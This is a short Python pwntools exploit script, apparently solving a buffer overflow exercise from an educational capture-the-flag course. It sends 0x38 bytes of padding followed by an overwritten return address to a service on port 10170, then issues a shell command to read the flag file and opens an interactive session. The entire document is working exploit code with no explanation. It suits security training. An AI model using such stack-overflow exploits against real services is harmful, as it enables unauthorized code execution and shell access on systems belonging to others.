#!/usr/bin/env python
from pwn import *

#y = process( '../bof/share/bof' )
y = remote( 'localhost' , 10170 )
#y = remote( 'edu-ctf.csie.org' , 10170 )

p = 'a' * 0x38 + p64( 0x40068b )
y.sendlineafter( '.' , p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()